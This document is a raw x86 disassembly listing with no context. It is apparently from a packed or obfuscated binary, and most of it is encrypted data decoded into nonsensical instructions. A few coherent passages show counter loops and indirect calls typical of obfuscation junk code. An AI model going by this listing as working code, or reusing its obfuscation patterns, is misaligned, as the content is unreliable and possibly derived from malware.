  402124:	dec    esp
  402125:	lock and eax,0xa11899cb
  40212b:	fcom   QWORD PTR [edx-0x7f3df5e1]
  402131:	outs   dx,DWORD PTR ds:[esi]
  402132:	out    0x15,eax
  402134:	xor    al,0x19
  402136:	jp     0x4020c4
  402138:	push   ebp
  402139:	and    BYTE PTR [ebx-0x705833ae],dh
  40213f:	lea    esi,[ebp+0x60920847]
  402145:	and    eax,esp
  402147:	sbb    BYTE PTR [edx-0x32abb558],al
  40214d:	mov    edx,0xd295b48a
  402152:	push   esi
  402153:	ins    BYTE PTR es:[edi],dx
  402154:	jmp    0x7bf0b112
  402159:	dec    ecx
  40215a:	lods   al,BYTE PTR ds:[esi]
  40215b:	push   0x789c4963
  402160:	xchg   edx,eax
  402161:	loop   0x40216e
  402163:	loopne 0x4021d7
  402165:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402166:	les    edx,FWORD PTR ds:0x2b375e1e
  40216c:	dec    edi
  40216d:	out    dx,al
  40216e:	inc    edi
  40216f:	arpl   dx,si
  402171:	bound  ecx,QWORD PTR ds:0x144ffc2c
  402177:	jl     0x402135
  402179:	ja     0x40219b
  40217b:	jge    0x402194
  40217d:	xor    dl,dh
  40217f:	jecxz  0x4021f3
  402181:	inc    esp
  402182:	out    dx,eax
  402183:	mov    BYTE PTR [esi+0x1d],dl
  402186:	fstp   QWORD PTR [ebp-0x3b414fec]
  40218c:	xchg   DWORD PTR [ebx-0x42],ebx
  40218f:	jno    0x402182
  402191:	xchg   ecx,eax
  402192:	popa   
  402193:	(bad)  
  402194:	inc    esp
  402195:	mov    ch,0x13
  402197:	xor    eax,0x2e55d8e1
  40219c:	push   esi
  40219d:	dec    eax
  40219e:	out    0xdf,al
  4021a0:	jo     0x40217a
  4021a2:	or     DWORD PTR [eax],ebx
  4021a4:	push   ecx
  4021a5:	mov    eax,ds:0x57cfca8d
  4021aa:	(bad)  
  4021ab:	sbb    DWORD PTR [edx+0x7f],eax
  4021ae:	not    DWORD PTR [ebp-0x4b2481bc]
  4021b4:	and    al,0x68
  4021b6:	inc    edx
  4021b7:	ret    0x2492
  4021ba:	xchg   ebx,eax
  4021bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021bc:	inc    esp
  4021bd:	push   edi
  4021be:	xchg   ecx,eax
  4021bf:	gs adc al,0x81
  4021c2:	sbb    BYTE PTR [ebx],al
  4021c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021c5:	fld    QWORD PTR [ecx+0x31]
  4021c8:	imul   ebx,DWORD PTR ds:0x90bd76ef,0x3
  4021cf:	sbb    BYTE PTR [edi+0x10],dh
  4021d2:	pop    ebx
  4021d3:	xchg   BYTE PTR [ecx-0x64aa40f3],al
  4021d9:	mov    ebp,0x4c2ca954
  4021de:	mov    esp,0xdf31ece2
  4021e3:	nop
  4021e4:	jb     0x402219
  4021e6:	mov    ebx,0xf85ed3cd
  4021eb:	loop   0x40220b
  4021ed:	aam    0xe2
  4021ef:	out    dx,eax
  4021f0:	dec    ebp
  4021f1:	popa   
  4021f2:	fidivr WORD PTR [edi+ebx*8+0x5d26945]
  4021f9:	mov    al,0x32
  4021fb:	out    dx,eax
  4021fc:	(bad)  
  4021fd:	jp     0x402211
  4021ff:	adc    BYTE PTR [ecx+eax*1],dl
  402202:	test   BYTE PTR [edx+0x44],cl
  402205:	and    ebp,DWORD PTR [edi-0x6d]
  402208:	cmp    DWORD PTR [esi-0x24],edi
  40220b:	shl    BYTE PTR [esi-0x2e],cl
  40220e:	mov    edx,0x532df99e
  402213:	or     eax,0x9e20ea2a
  402218:	cmp    eax,0xfcf67f8d
  40221d:	cmp    cl,ch
  40221f:	sbb    edx,DWORD PTR [edx]
  402221:	lods   al,BYTE PTR ds:[esi]
  402222:	cmp    DWORD PTR [esi+0x2825eea9],edi
  402228:	popa   
  402229:	push   ss
  40222a:	and    bl,ah
  40222c:	cmc    
  40222d:	or     eax,0x8b4b5dc2
  402232:	xor    esi,edi
  402234:	push   DWORD PTR [edx-0x1efb4627]
  40223a:	xchg   ebp,eax
  40223b:	pop    ss
  40223c:	dec    esi
  40223d:	fmul   QWORD PTR [ebx]
  40223f:	clc    
  402240:	dec    esi
  402241:	and    BYTE PTR [ecx-0x1a],bh
  402244:	push   0x44fbc13c
  402249:	jnp    0x40223e
  40224b:	mov    es,WORD PTR [edx+0x4608c858]
  402251:	and    ecx,DWORD PTR [edi-0x70]
  402254:	out    0x6,al
  402256:	cwde   
  402257:	dec    esi
  402258:	out    0xee,eax
  40225a:	push   es
  40225b:	add    ecx,DWORD PTR [eax+0x66]
  40225e:	jmp    0x4022a1
  402260:	mov    esp,0x74c47fbe
  402265:	or     eax,0x4fc6f60c
  40226a:	jmp    0xe4be2cef
  40226f:	xchg   ecx,eax
  402270:	mov    DWORD PTR [edi],ecx
  402272:	cmp    dh,dh
  402274:	push   edi
  402275:	dec    ecx
  402276:	mov    ecx,0xccb6a533
  40227b:	sbb    eax,0xd3911e01
  402280:	xchg   ebp,eax
  402281:	out    0x30,eax
  402283:	or     ebx,DWORD PTR [ebp+eax*2+0xca6fad1]
  40228a:	iret   
  40228b:	jns    0x402300
  40228d:	jnp    0x4022e9
  40228f:	add    edx,DWORD PTR [ebx]
  402291:	xchg   esi,eax
  402292:	ret    0x1266
  402295:	in     al,0xc7
  402297:	lahf   
  402298:	clc    
  402299:	std    
  40229a:	sbb    eax,0x72b59447
  40229f:	fdiv   QWORD PTR [edi+0x67]
  4022a2:	sbb    ch,dl
  4022a4:	sbb    dh,ah
  4022a6:	out    0xa3,eax
  4022a8:	pop    ebp
  4022a9:	push   ecx
  4022aa:	dec    edx
  4022ab:	mov    bh,0x7b
  4022ad:	imul   edx,eax,0xffffff90
  4022b0:	sub    eax,0x4195081c
  4022b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4022b6:	push   cs
  4022b7:	loopne 0x4022c0
  4022b9:	ret    
  4022ba:	cmp    BYTE PTR [eax+0x2acc19c4],0x32
  4022c1:	cld    
  4022c2:	sbb    al,0xf6
  4022c4:	sub    eax,0x4cdbc526
  4022c9:	mov    bh,0xfd
  4022cb:	push   ecx
  4022cc:	and    DWORD PTR ds:0x42edef,0x0
  4022d6:	mov    edx,DWORD PTR ds:0x42edef
  4022dc:	inc    edx
  4022dd:	mov    DWORD PTR ds:0x42edef,edx
  4022e3:	cmp    DWORD PTR ds:0x42edef,0x28
  4022ea:	jne    0x4022fe
  4022f0:	push   DWORD PTR [ebp-0x18]
  4022f3:	push   0x56d1
  4022f8:	call   DWORD PTR ds:0x42e9bf
  4022fe:	cmp    DWORD PTR ds:0x42edef,0x19
  402305:	jb     0x4022d6
  40230b:	mov    DWORD PTR ds:0x430441,0x1f
  402315:	cmp    DWORD PTR ds:0x430441,0x0
  40231c:	je     0x402548
  402322:	cmp    DWORD PTR ds:0x430441,0x2c
  402329:	jne    0x40233a
  40232f:	push   0x7b19
  402334:	call   DWORD PTR ds:0x42e9af
  40233a:	xor    edx,edx
  40233c:	xor    edx,DWORD PTR ds:0x430441
  402342:	dec    edx
  402343:	mov    DWORD PTR ds:0x430441,edx
  402349:	jmp    0x402315
  40234e:	adc    eax,edx
  402350:	jmp    0x402548
  402355:	ds je  0x4022d9
  402358:	cdq    
  402359:	mov    cl,0x69
  40235b:	out    0x71,al
  40235d:	sub    al,0x9b
  40235f:	mov    cl,0x3a
  402361:	xchg   esi,eax
  402362:	mov    eax,0x3db25a9
  402367:	jle    0x4023e7
  402369:	push   ebp
  40236a:	jg     0x4023ea
  40236c:	jle    0x40238f
  40236e:	inc    esi
  40236f:	out    0xc1,eax
  402371:	inc    edi
  402372:	jp     0x4023f3
  402374:	jmp    FWORD PTR [ebx-0x7]
  402377:	into   
  402378:	add    bl,BYTE PTR [eax-0x2d]
  40237b:	jmp    0x52a1:0x53329606
  402382:	retf   
  402383:	inc    eax
  402384:	sub    eax,0x7c4077e6
  402389:	push   0xc46dc855
  40238e:	pop    esi
  40238f:	arpl   WORD PTR [edi],ax
  402391:	data16 shl BYTE PTR gs:[ecx],1
  402395:	pushf  
  402396:	fcmovnb st,st(0)
  402398:	jo     0x4023eb
  40239a:	int    0x7a
  40239c:	jmp    0x40239f
  40239e:	or     DWORD PTR [ebx],0x49
  4023a1:	push   es
  4023a2:	or     eax,0x820cf2f6
  4023a7:	int    0x9b
  4023a9:	stos   DWORD PTR es:[edi],eax
  4023aa:	or     BYTE PTR [edi-0xf],dl
  4023ad:	jnp    0x402406
  4023af:	hlt    
  4023b0:	and    al,0x9
  4023b2:	test   cl,0xe
  4023b5:	pop    es
  4023b6:	out    dx,eax
  4023b7:	pop    edx
  4023b8:	inc    DWORD PTR [esi+edi*8]
  4023bb:	leave  
  4023bc:	push   esi
  4023bd:	adc    al,0x46
  4023bf:	sti    
  4023c0:	xor    esp,DWORD PTR [esi+edx*4-0x19]
  4023c4:	xor    bl,ch
  4023c6:	dec    eax
  4023c7:	and    DWORD PTR [ebx-0x4e],ebp
  4023ca:	aaa    
  4023cb:	(bad)  [ebp-0x1699aa8b]
  4023d1:	mov    eax,ds:0x6ec0f3f8
  4023d6:	push   es
  4023d7:	lock lds ecx,FWORD PTR [si]
  4023db:	ret    
  4023dc:	adc    al,0xaf
  4023de:	rcl    DWORD PTR [ecx+0x7c2a9d83],0x65
  4023e5:	(bad)  
  4023e6:	loope  0x402404
  4023e8:	sub    edx,0x7e
  4023eb:	and    ebp,DWORD PTR [ebx+0x51]
  4023ee:	mov    edi,0xf8fe033b
  4023f3:	int3   
  4023f4:	sub    DWORD PTR [eax],ebp
  4023f6:	xor    DWORD PTR [esi-0x48],esp
  4023f9:	and    cl,0xdb
  4023fc:	enter  0x23c8,0xf5
  402400:	mov    esi,0xb3abddea
  402405:	fsub   DWORD PTR [eax-0x6d5f69ea]
  40240b:	add    DWORD PTR [esi+0x57221ba],0x11
  402412:	pop    esi
  402413:	stos   DWORD PTR es:[edi],eax
  402414:	mov    esp,0xc435b224
  402419:	retf   
  40241a:	(bad)  
  40241b:	jl     0x402477
  40241d:	ret    0x1b57
  402420:	bound  edi,QWORD PTR [eax+0x1df0505e]
  402426:	jge    0x402466
  402428:	mov    ch,0xba
  40242a:	rol    DWORD PTR [esi-0x7a],cl
  40242d:	sbb    ecx,edi
  40242f:	data16 outs dx,BYTE PTR ds:[esi]
  402431:	sbb    eax,0x57daa926
  402436:	aas    
  402437:	js     0x4024a1
  402439:	mov    al,0xe3
  40243b:	jl     0x402426
  40243d:	imul   eax,esp,0x842077a3
  402443:	mov    ah,0xcc
  402445:	adc    bl,BYTE PTR [esi]
  402447:	and    DWORD PTR [eax-0x49],edi
  40244a:	mov    esp,0xdf9fca7
  40244f:	cmp    DWORD PTR ds:0xbc46cfa,edi
  402455:	js     0x4024d3
  402457:	or     al,0x58
  402459:	stos   BYTE PTR es:[edi],al
  40245a:	dec    ecx
  40245b:	mul    ebx
  40245d:	loopne 0x402460
  40245f:	jge    0x402480
  402461:	scas   eax,DWORD PTR es:[edi]
  402462:	aaa    
  402463:	inc    eax
  402464:	(bad)  
  402465:	imul   ecx,DWORD PTR [ebp-0x70],0xffffffa7
  402469:	or     bh,BYTE PTR [edx-0x71cd75cb]
  40246f:	inc    ebx
  402470:	jae    0x4024db
  402472:	xchg   edx,eax
  402473:	sub    edx,DWORD PTR [esi+0x2f]
  402476:	shl    BYTE PTR [ebp+0x2e],1
  402479:	add    edx,esp
  40247b:	pop    ecx
  40247c:	gs icebp 
  40247e:	(bad)  
  40247f:	enter  0xac5a,0x6d
  402483:	xor    al,0x30
  402485:	mov    eax,0xdebd4ee8
  40248a:	and    DWORD PTR [ebx],ebx
  40248c:	mov    edx,0x3811cedb
  402491:	in     eax,0xb4
  402493:	repz xor al,0x6c
  402496:	fmul   DWORD PTR [esi+eax*2+0x73cc32e9]
  40249d:	xor    ah,BYTE PTR [edx+0x34]
  4024a0:	push   edi
  4024a1:	outs   dx,BYTE PTR ds:[esi]
  4024a2:	and    DWORD PTR [ebp+0x6d],0xffffffb4
  4024a6:	mov    esi,0x2cafe574
  4024ab:	pop    ebp
  4024ac:	sar    DWORD PTR [edx+eiz*4-0x3b],1
  4024b0:	adc    BYTE PTR [edi],0x34
  4024b3:	jmp    0x44d3777e
  4024b8:	call   0x7696:0x5b5440aa
  4024bf:	mov    ch,0xab
  4024c1:	mov    eax,ds:0x9f91e52c
  4024c6:	xor    ebp,ebp
  4024c8:	add    eax,0x1ad2a2d4
  4024cd:	outs   dx,BYTE PTR ds:[esi]
  4024ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4024cf:	push   0x8f9120fb
  4024d4:	cdq    
  4024d5:	dec    edx
  4024d6:	mov    dl,0x3b
  4024d8:	and    bh,dl
  4024da:	cld    
  4024db:	mov    eax,ds:0xec396d11
  4024e0:	push   es
  4024e1:	pop    ds
  4024e2:	sbb    DWORD PTR ds:0xd97e34af,ecx
  4024e8:	scas   eax,DWORD PTR es:[edi]
  4024e9:	pop    esi
  4024ea:	in     al,0xf3
  4024ec:	dec    ebx
  4024ed:	jbe    0x402516
  4024ef:	mov    edi,DWORD PTR [ebx+0x19]
  4024f2:	fnstenv [eax+0x334f6720]
  4024f8:	iret   
  4024f9:	icebp  
  4024fa:	adc    BYTE PTR [edx-0x1],0x13
  4024fe:	push   es
  4024ff:	xcrypt-cfb (bad)
  402500:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402501:	out    0xc9,eax
  402503:	mov    ch,0x6d
  402505:	cmp    cl,BYTE PTR [esi-0x56755c1f]
  40250b:	test   ebx,esp
  40250d:	pop    ebx
  40250e:	mov    dh,0x47
  402510:	fcom   DWORD PTR [ebx-0x5e2599b5]
  402516:	fcomp  st(0)
  402518:	ins    BYTE PTR es:[edi],dx
  402519:	pop    eax
  40251a:	fstp   TBYTE PTR [edx+0x4f]
  40251d:	test   BYTE PTR [eax-0x711f860a],ch
  402523:	xor    bl,al
  402525:	test   DWORD PTR [esi+0x6c],esp
  402528:	sub    dl,bl
  40252a:	xchg   edi,eax
  40252b:	sub    bl,BYTE PTR ds:0xf3ec6b94
  402531:	mov    cl,0x14
  402533:	pushf  
  402534:	repnz adc DWORD PTR [edi+0x5db4b0ae],eax
  40253b:	daa    
  40253c:	push   0xee5db1f
  402541:	fisttp WORD PTR [edi+0x32]
  402544:	sub    eax,DWORD PTR [esi-0x7eae0ca1]
  40254a:	and    eax,0x42edcb
  40254f:	cmp    DWORD PTR [ebx],esi
  402551:	add    BYTE PTR [eax],al
  402553:	mov    eax,0xf89c8531
  402558:	movzx  edx,WORD PTR ds:0x42edf3
  40255f:	xor    edx,DWORD PTR ds:0x42edcf
  402565:	mov    DWORD PTR ds:0x42edf3,edx
  40256b:	mov    DWORD PTR [ebp-0x8],eax
  40256e:	xor    ecx,ecx
  402570:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  402577:	mov    edx,DWORD PTR [ebp-0x8]
  40257a:	add    DWORD PTR ds:0x430465,0x1aee
  402584:	push   esi
  402585:	mov    ecx,0x7510854
  40258a:	xor    esi,esi
  40258c:	or     esi,DWORD PTR ds:0x430445
  402592:	and    DWORD PTR ds:0x42edd7,esi
  402598:	xor    edx,ecx
  40259a:	and    DWORD PTR ds:0x4304cf,0x0
  4025a4:	jmp    0x4025b8
  4025a9:	xor    esi,esi
  4025ab:	xor    esi,DWORD PTR ds:0x4304cf
  4025b1:	inc    esi
  4025b2:	mov    DWORD PTR ds:0x4304cf,esi
  4025b8:	cmp    DWORD PTR ds:0x4304cf,0x10
  4025bf:	jae    0x4025fc
  4025c5:	cmp    DWORD PTR ds:0x4304cf,0x9
  4025cc:	jne    0x4025dd
  4025d2:	push   0x42e846
  4025d7:	call   DWORD PTR ds:0x42e9c3
  4025dd:	cmp    DWORD PTR ds:0x4304cf,0x8
  4025e4:	jne    0x4025f7
  4025ea:	mov    esi,DWORD PTR ds:0x4304cf
  4025f0:	inc    esi
  4025f1:	mov    DWORD PTR ds:0x4304cf,esi
  4025f7:	jmp    0x4025a9
  4025fc:	mov    esi,0x32729b
  402601:	jmp    0x4027f9
  402606:	lock and ch,BYTE PTR [esi+eax*1-0xf8f6f94]
  40260e:	xchg   edi,eax
  40260f:	aaa    
  402610:	ins    DWORD PTR es:[edi],dx
  402611:	fs inc esi
  402613:	lods   al,BYTE PTR ds:[esi]
  402614:	(bad)  
  402615:	or     eax,0x7e7e013e
  40261a:	push   ebp
  40261b:	jg     0x40269b
  40261d:	jle    0x4025fe
  40261f:	xchg   ebx,eax
  402620:	scas   al,BYTE PTR es:[edi]
  402621:	xchg   dh,al
  402623:	arpl   sp,dx
  402625:	xlat   BYTE PTR ds:[ebx]
  402626:	fnstcw WORD PTR [ecx+0x78]
  402629:	dec    edi
  40262a:	dec    ebx
  40262b:	dec    eax
  40262c:	mov    ds:0x3787675d,al
  402631:	or     esi,DWORD PTR [esi+0x4e]
  402634:	mov    eax,ds:0xde2d967c
  402639:	aaa    
  40263a:	out    dx,al
  40263b:	add    al,0x22
  40263d:	jno    0x4025d6
  40263f:	jle    0x40266d
  402641:	pop    ebp
  402642:	test   BYTE PTR [edi-0x323cd28b],dl
  402648:	cmp    eax,0x638c9783
  40264d:	sub    DWORD PTR [ebp-0x4a],edx
  402650:	aas    
  402651:	lea    esi,[edi-0x2935d5a7]
  402657:	jnp    0x402685
  402659:	jmp    0x2b26dfd4
  40265e:	jae    0x40261d
  402660:	or     ah,ch
  402662:	es (bad) 
  402664:	gs inc ebp
  402666:	in     al,dx
  402667:	push   ecx
  402668:	mov    es,WORD PTR [edi+0x30]
  40266b:	sub    ebp,ebx
  40266d:	push   es
  40266e:	cmp    ecx,esp
  402670:	stos   DWORD PTR es:[edi],eax
  402671:	add    eax,0xd763dc4a
  402676:	das    
  402677:	fdivr  st,st(2)
  402679:	push   edi
  40267a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40267b:	or     al,0xe1
  40267d:	stc    
  40267e:	mov    cl,0x94
  402680:	fst    DWORD PTR [ecx-0x7a]
  402683:	push   cs
  402684:	xor    DWORD PTR [ecx+eiz*8+0x532bedf2],esp
  40268b:	xor    BYTE PTR ds:0xf319fcf0,bl
  402691:	adc    eax,0x5012424
  402696:	and    BYTE PTR [ecx+0x46e34356],dl
  40269c:	adc    BYTE PTR [ebp-0x2],dh
  40269f:	mov    dh,0x87
  4026a1:	enter  0x1275,0x46
  4026a5:	jbe    0x4026bf
  4026a7:	std    
  4026a8:	and    al,0x2d
  4026aa:	je     0x4026f2
  4026ac:	out    0xa,al
  4026ae:	(bad)  
  4026b0:	pop    ss
  4026b1:	sbb    DWORD PTR [eax+0x6d9b8b73],ecx
  4026b7:	adc    al,0x4f
  4026b9:	inc    ebp
  4026ba:	inc    ebp
  4026bb:	adc    DWORD PTR ds:[ecx+0x4],ecx
  4026bf:	(bad)  
  4026c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026c2:	(bad)  [edi]
  4026c4:	inc    edx
  4026c5:	hlt    
  4026c6:	inc    edi
  4026c7:	repnz out dx,eax
  4026c9:	outs   dx,BYTE PTR ds:[esi]
  4026ca:	popf   
  4026cb:	leave  
  4026cc:	pop    ebx
  4026cd:	sub    ch,BYTE PTR [ebp-0x5]
  4026d0:	inc    edi
  4026d1:	sub    eax,0xae5b5a19
  4026d6:	sti    
  4026d7:	adc    bl,BYTE PTR [edx-0x42]
  4026da:	out    0xd0,al
  4026dc:	mov    al,ds:0x902a8739
  4026e1:	js     0x402678
  4026e3:	int3   
  4026e4:	gs push ss
  4026e6:	jmp    FWORD PTR [ebx+ecx*8]
  4026e9:	stos   BYTE PTR es:[edi],al
  4026ea:	sub    eax,0x6a176393
  4026ef:	int    0xe3
  4026f1:	xchg   ebp,eax
  4026f2:	adc    ebp,edi
  4026f4:	imul   esi,DWORD PTR [ebx+ebp*4+0x2a],0x2951a15
  4026fc:	loope  0x402763
  4026fe:	imul   esi,DWORD PTR [ecx],0xffffffec
  402701:	sbb    ch,BYTE PTR [edi]
  402703:	pop    eax
  402704:	out    dx,eax
  402705:	mov    ecx,0x7d023e53
  40270a:	shr    BYTE PTR [esi-0xc],1
  40270d:	push   ebx
  40270e:	hlt    
  40270f:	popw   ss
  402711:	ds jge 0x3b1d89ce
  402718:	jmp    0x361:0x6295967
  40271f:	xlat   BYTE PTR ds:[ebx]
  402720:	push   esi
  402721:	add    ebx,DWORD PTR [ecx]
  402723:	mov    ch,0x6
  402725:	pop    ebp
  402726:	loop   0x4027a1
  402728:	xchg   esi,eax
  402729:	ja     0x402777
  40272b:	fdivr  QWORD PTR [ecx-0x4a2cb263]
  402731:	jmp    0x4027af
  402733:	mov    ah,0xf7
  402735:	repz adc ecx,ebx
  402738:	sbb    dl,BYTE PTR [edx-0x70bd8d57]
  40273e:	ja     0x4027a0
  402740:	adc    BYTE PTR [edi-0x208d6e8d],ch
  402746:	cmp    eax,0xf40bba3a
  40274b:	shl    bh,cl
  40274d:	nop
  40274e:	mov    bh,0xc1
  402750:	or     eax,0x36790438
  402755:	imul   esp,DWORD PTR [ebx-0x57fe4f14],0xfe06974
  40275f:	jle    0x40273c
  402761:	dec    esi
  402762:	mov    bh,BYTE PTR [eax+0x68]
  402765:	popa   
  402766:	in     al,0x2b
  402768:	add    ebp,DWORD PTR [edx+0x742d2e3f]
  40276e:	aas    
  40276f:	nop
  402770:	rol    DWORD PTR [edi],cl
  402772:	imul   ebp,DWORD PTR [eax+eiz*4],0x6e
  402776:	jns    0x402733
  402778:	loopne 0x402781
  40277a:	cs pop ecx
  40277c:	push   esp
  40277d:	into   
  40277e:	mov    eax,0x6ff13a85
  402783:	enter  0x9550,0x3a
  402787:	pop    ebp
  402788:	mov    bl,0xb6
  40278a:	lea    ebx,[esi-0x1e12cefe]
  402790:	daa    
  402791:	lods   eax,DWORD PTR ds:[esi]
  402792:	enter  0x28a9,0x1c
  402796:	jnp    0x402787
  402798:	push   eax
  402799:	xchg   esp,eax
  40279a:	and    dl,BYTE PTR [ecx+eax*4-0x917d8e9]
  4027a1:	mov    dh,0xd3
  4027a3:	push   esp
  4027a4:	sub    bl,dh
  4027a6:	dec    esi
  4027a7:	cmp    al,0x18
  4027a9:	leave  
  4027aa:	rcl    DWORD PTR [ebx+0x42bb3df8],1
  4027b0:	nop
  4027b1:	popa   
  4027b2:	mov    al,ds:0x9ec9f49e
  4027b7:	mov    esp,0x4d3a1930
  4027bc:	frstor [edi+edx*2-0x5e]
  4027c0:	fadd   QWORD PTR [ebp+0x2c]
  4027c3:	and    dl,BYTE PTR [esi]
  4027c5:	jns    0x40280a
  4027c7:	(bad)  
  4027c8:	stos   DWORD PTR es:[edi],eax
  4027c9:	xor    eax,0x5e07e9a5
  4027ce:	dec    ebx
  4027cf:	cld    
  4027d0:	pop    ds
  4027d1:	imul   ebx,ebx,0xffffff8b
  4027d4:	and    DWORD PTR [esi-0x32],0xd9d942eb
  4027db:	mov    al,0x7e
  4027dd:	out    dx,eax
  4027de:	js     0x402844
  4027e0:	push   es
  4027e1:	sbb    dh,al
  4027e3:	xor    bh,BYTE PTR [edi]
  4027e5:	scas   eax,DWORD PTR es:[edi]
  4027e6:	aas    
  4027e7:	mov    ecx,ecx
  4027e9:	mov    esi,0xcc87efa9
  4027ee:	inc    esi
  4027ef:	push   ebx
  4027f0:	dec    ebx
  4027f1:	(bad)
  4027f4:	or     eax,0x4c83784
  4027f9:	push   edi
  4027fa:	mov    edi,DWORD PTR [ebp+0x10]
  4027fd:	add    edx,esi
  4027ff:	cmp    edi,edx
  402801:	je     0x402e62
  402807:	mov    edx,DWORD PTR [ebp-0x8]
  40280a:	mov    eax,DWORD PTR [ebp-0x4]
  40280d:	xor    eax,ecx
  40280f:	mov    edi,0xffcd8d65
  402814:	sub    edi,eax
  402816:	jmp    0x402a0e
  40281b:	ins    BYTE PTR es:[edi],dx
  40281c:	cmp    al,0x55
  40281e:	arpl   WORD PTR [ebp+0x73],si
  402821:	push   0x2ad4f5d1
  402826:	xor    DWORD PTR [edi],eax
  402828:	push   esi
  402829:	add    al,0x79
  40282b:	adc    eax,0x557e7e0f
  402830:	jg     0x4028b0
  402832:	jle    0x4027b4
  402834:	jo     0x40280e
  402836:	adc    BYTE PTR [ebp-0x4a],bl
  402839:	push   ecx
  40283a:	xor    eax,DWORD PTR [ebx+0x34d3e28e]
  402840:	ss fadd st,st(4)
  402843:	ja     0x4027cc
  402845:	loop   0x402827
  402847:	sahf   
  402848:	xor    eax,0xae27495e
  40284d:	xor    dl,dh
  40284f:	stos   DWORD PTR es:[edi],eax
  402850:	cmp    al,0x25
  402852:	cmp    eax,0xb5608107
  402857:	mov    ah,0xdc
  402859:	xor    DWORD PTR [ebp-0x2],0x5
  40285d:	retf   
  40285e:	imul   edx,DWORD PTR [edx-0x4b],0x7b
  402862:	cli    
  402863:	push   edi
  402864:	lock push esi
  402866:	or     al,0x95
  402868:	pop    esp
  40286a:	mov    DWORD PTR [edi],0xa7b37f10
  402870:	loop   0x4028bb
  402872:	stos   DWORD PTR es:[edi],eax
  402873:	shl    DWORD PTR [ecx+0x7f3f5bda],0xc4
  40287a:	mov    al,ds:0x940a2c5a
  40287f:	xor    eax,0x2d996f82
  402884:	repnz iret 
  402886:	fnsave [edx+0x2fd542bc]
  40288c:	push   ss
  40288d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40288e:	imul   ebp,DWORD PTR [ecx+0x2c574058],0xe16999df
  402898:	sbb    DWORD PTR [esi+eax*4],ebx
  40289b:	ror    BYTE PTR [eax-0x4df6f47],0xbe
  4028a2:	dec    edx
  4028a3:	adc    esp,DWORD PTR [ecx-0x18995272]
  4028a9:	int    0x1d
  4028ab:	push   edi
  4028ac:	retf   
  4028ad:	pop    edx
  4028ae:	data16 mov al,ds:0x792b23fd
  4028b4:	cmp    BYTE PTR fs:[edx-0x7c6a44c1],al
  4028bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4028bc:	add    ch,BYTE PTR [ebx]
  4028be:	lahf   
  4028bf:	and    BYTE PTR [ecx+esi*4],cl
  4028c2:	gs aad 0xe
  4028c5:	mov    ecx,0x62ab4059
  4028ca:	mov    bl,0x97
  4028cc:	sahf   
  4028cd:	inc    ebx
  4028ce:	add    al,0xbe
  4028d0:	and    edx,DWORD PTR [eax+0x58408460]
  4028d6:	ss popa 
  4028d8:	adc    al,0x71
  4028da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4028db:	cmp    DWORD PTR [ecx-0x16],esp
  4028de:	fs (bad) 
  4028e0:	adc    BYTE PTR [eax+0x401d23bf],bh
  4028e6:	out    0x61,al
  4028e8:	adc    al,0x55
  4028ea:	cmp    dl,dl
  4028ec:	pop    eax
  4028ed:	mov    bl,0x8c
  4028ef:	mov    eax,edx
  4028f1:	ret    0x28ef
  4028f4:	pusha  
  4028f5:	xchg   esp,eax
  4028f6:	push   esi
  4028f7:	stos   BYTE PTR es:[edi],al
  4028f8:	jae    0x4028da
  4028fa:	(bad)  
  4028fc:	das    
  4028fd:	ror    dh,cl
  4028ff:	cs pop edi
  402901:	ins    BYTE PTR es:[edi],dx
  402902:	dec    edx
  402903:	xchg   ebp,eax
  402904:	test   BYTE PTR [edi+edi*4],ch
  402907:	or     esp,DWORD PTR [esi]
  402909:	sub    al,0x2c
  40290b:	clc    
  40290c:	pushf  
  40290d:	add    bh,BYTE PTR [esi-0x274cd1bd]
  402913:	jecxz  0x4028e6
  402915:	js     0x4028c4
  402917:	push   ebp
  402918:	imul   ebx,DWORD PTR [eax+0x4b830333],0x26
  40291f:	xchg   edi,eax
  402920:	add    BYTE PTR [eax],bl
  402922:	adc    bl,BYTE PTR [edx]
  402924:	or     esp,0x3f2a95e4
  40292a:	xor    eax,DWORD PTR [eax-0x2c]
  40292d:	js     0x4028d0
  40292f:	jg     0x40292c
  402931:	fs out dx,al
  402933:	ins    BYTE PTR es:[edi],dx
  402934:	mov    ds:0x441d0754,eax
  402939:	sub    DWORD PTR [ebx+0x19e68264],ebx
  40293f:	jmp    0x40293a
  402941:	inc    esp
  402942:	enter  0xb44,0x9b
  402946:	into   
  402947:	jb     0x4028d9
  402949:	sub    edi,0x279cd45f
  40294f:	pop    es
  402950:	rcl    DWORD PTR [edx+0x63],1
  402953:	enter  0xff9b,0xd8
  402957:	pop    ss
  402958:	addr16 dec eax
  40295a:	push   es
  40295b:	pop    eax
  40295c:	dec    esp
  40295d:	test   ecx,ecx
  40295f:	cs cmp eax,0x2d8216e1
  402965:	sub    DWORD PTR [edi],0x87498718
  40296b:	(bad)  
  40296d:	int3   
  40296e:	stos   DWORD PTR es:[edi],eax
  40296f:	ret    
  402970:	test   eax,0xb0e863c1
  402975:	out    dx,eax
  402976:	mov    ecx,0x6c0a0761
  40297b:	mov    edi,0x23913fda
  402980:	xor    BYTE PTR [edx+0x2d9830fb],cl
  402986:	cwde   
  402987:	pop    edi
  402988:	add    al,BYTE PTR es:0xad7b412e
  40298f:	pushf  
  402990:	sbb    ch,ah
  402992:	push   0xcf60e639
  402997:	add    al,0x8a
  402999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40299a:	pop    ss
  40299b:	div    DWORD PTR [ebp-0x76]
  40299e:	aaa    
  40299f:	sbb    ch,ah
  4029a1:	adc    al,0x17
  4029a3:	pop    edi
  4029a4:	iret   
  4029a5:	or     ch,BYTE PTR [edi+0x29]
  4029a8:	daa    
  4029a9:	mov    esp,0xc6b35ef1
  4029ae:	cmc    
  4029af:	int3   
  4029b0:	xchg   ebp,eax
  4029b1:	jno    0x4029cb
